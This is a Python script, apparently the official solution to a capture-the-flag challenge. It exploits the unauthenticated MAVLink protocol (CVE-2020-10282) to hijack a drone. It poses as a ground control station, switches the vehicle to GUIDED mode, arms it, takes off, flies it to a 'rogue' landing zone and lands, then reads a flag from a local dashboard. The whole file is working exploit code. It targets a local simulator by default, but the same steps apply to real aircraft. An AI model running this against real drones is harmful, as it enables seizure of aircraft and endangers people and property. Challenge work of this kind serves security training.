#!/usr/bin/env python3
"""Official solution for "No Handshake Required".

No key exchange, no session, no credentials. We just start speaking MAVLink at
the aircraft and it obeys — the practical form of CVE-2020-10282.

    pip install pymavlink
    python3 exploit.py --target udpout:127.0.0.1:14550
"""
import argparse
import json
import math
import sys
import time
import urllib.request

from pymavlink import mavutil

ROGUE_LAT = -35.363262
ROGUE_LON = 149.166537
CRUISE_ALT = 30.0

MAV_MODE_FLAG_SAFETY_ARMED = 128
COPTER_GUIDED = 4


def log(msg):
    print(f"[*] {msg}", flush=True)


def haversine_m(lat1, lon1, lat2, lon2):
    r = 6371000.0
    p1, p2 = math.radians(lat1), math.radians(lat2)
    dp, dl = math.radians(lat2 - lat1), math.radians(lon2 - lon1)
    a = math.sin(dp / 2) ** 2 + math.cos(p1) * math.cos(p2) * math.sin(dl / 2) ** 2
    return 2 * r * math.asin(math.sqrt(a))


def wait_position(m, timeout=30):
    end = time.time() + timeout
    while time.time() < end:
        msg = m.recv_match(type="GLOBAL_POSITION_INT", blocking=True, timeout=2)
        if msg:
            return msg.lat / 1e7, msg.lon / 1e7, msg.relative_alt / 1000.0
    raise TimeoutError("no GLOBAL_POSITION_INT — is the link up?")


def send_cmd(m, cmd, *params):
    m.mav.command_long_send(
        m.target_system, m.target_component, cmd, 0, *(list(params) + [0] * (7 - len(params)))
    )


def set_mode_guided(m):
    """Nobody asked who we are."""
    log("switching to GUIDED")
    m.mav.set_mode_send(
        m.target_system,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        COPTER_GUIDED,
    )
    end = time.time() + 15
    while time.time() < end:
        hb = m.recv_match(type="HEARTBEAT", blocking=True, timeout=2)
        if hb and hb.custom_mode == COPTER_GUIDED:
            log("  mode = GUIDED")
            return
    raise TimeoutError("mode change refused")


def wait_ready(m, timeout=180):
    """The EKF needs a settled position estimate before it will accept an arm."""
    log("waiting for a position estimate")
    end = time.time() + timeout
    while time.time() < end:
        msg = m.recv_match(type="GPS_RAW_INT", blocking=True, timeout=3)
        if msg and msg.fix_type >= 3 and msg.satellites_visible >= 6:
            lat, lon, _ = wait_position(m)
            if lat != 0.0 or lon != 0.0:
                log(f"  3D fix, {msg.satellites_visible} sats")
                return
    raise TimeoutError("no usable position estimate — is the SITL still booting?")


def arm(m, timeout=60):
    log("arming")
    end = time.time() + timeout
    while time.time() < end:
        send_cmd(m, mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 1)
        hb = m.recv_match(type="HEARTBEAT", blocking=True, timeout=2)
        if hb and hb.base_mode & MAV_MODE_FLAG_SAFETY_ARMED:
            log("  armed")
            return
    raise TimeoutError("arming refused")


def takeoff(m, alt):
    log(f"takeoff to {alt}m")
    send_cmd(m, mavutil.mavlink.MAV_CMD_NAV_TAKEOFF, 0, 0, 0, 0, 0, 0, alt)
    end = time.time() + 90
    while time.time() < end:
        _, _, agl = wait_position(m, timeout=5)
        if agl >= alt * 0.92:
            log(f"  reached {agl:.1f}m")
            return
    raise TimeoutError("never reached altitude")


def goto(m, lat, lon, alt):
    log(f"redirecting to rogue LZ ({lat}, {lon})")
    end = time.time() + 180
    while time.time() < end:
        m.mav.set_position_target_global_int_send(
            0,
            m.target_system,
            m.target_component,
            mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
            0b0000111111111000,  # position only
            int(lat * 1e7),
            int(lon * 1e7),
            alt,
            0, 0, 0, 0, 0, 0, 0, 0,
        )
        cur_lat, cur_lon, _ = wait_position(m, timeout=5)
        dist = haversine_m(cur_lat, cur_lon, lat, lon)
        if dist < 3.0:
            log(f"  over the LZ ({dist:.1f}m)")
            return
    raise TimeoutError("never arrived at the LZ")


def land(m):
    log("landing")
    send_cmd(m, mavutil.mavlink.MAV_CMD_NAV_LAND)
    end = time.time() + 180
    while time.time() < end:
        hb = m.recv_match(type="HEARTBEAT", blocking=True, timeout=3)
        if hb and not (hb.base_mode & MAV_MODE_FLAG_SAFETY_ARMED):
            log("  disarmed on the ground")
            return
    raise TimeoutError("never disarmed")


def harvest_flag(dashboard, seconds=30):
    """The watcher releases the flag to the dashboard once it scores the landing."""
    log(f"polling {dashboard}/api/state for the flag")
    end = time.time() + seconds
    while time.time() < end:
        try:
            with urllib.request.urlopen(f"{dashboard}/api/state", timeout=5) as r:
                state = json.load(r)
            if state.get("flag"):
                print(f"\n[+] FLAG: {state['flag']}")
                print(f"[+] evidence: {state.get('evidence')}\n")
                return True
        except Exception as exc:
            log(f"  dashboard poll failed: {exc}")
        time.sleep(2)
    return False


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="udpout:127.0.0.1:14550")
    ap.add_argument("--dashboard", default="http://127.0.0.1:8090")
    ap.add_argument("--lat", type=float, default=ROGUE_LAT)
    ap.add_argument("--lon", type=float, default=ROGUE_LON)
    ap.add_argument("--alt", type=float, default=CRUISE_ALT)
    args = ap.parse_args()

    log(f"connecting {args.target}")
    m = mavutil.mavlink_connection(args.target, source_system=255)
    # The bridge listens on udpin: it only learns our return address once we
    # transmit. Announce ourselves as a GCS — nobody checks whether we are one.
    m.mav.heartbeat_send(
        mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0
    )
    m.wait_heartbeat()
    log(f"heartbeat from system {m.target_system} component {m.target_component} "
        f"— no authentication was requested")

    wait_ready(m)
    set_mode_guided(m)
    arm(m)
    takeoff(m, args.alt)
    goto(m, args.lat, args.lon, args.alt)
    land(m)

    if not harvest_flag(args.dashboard.rstrip("/")):
        log("no flag on the dashboard — check `docker compose logs watcher`")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
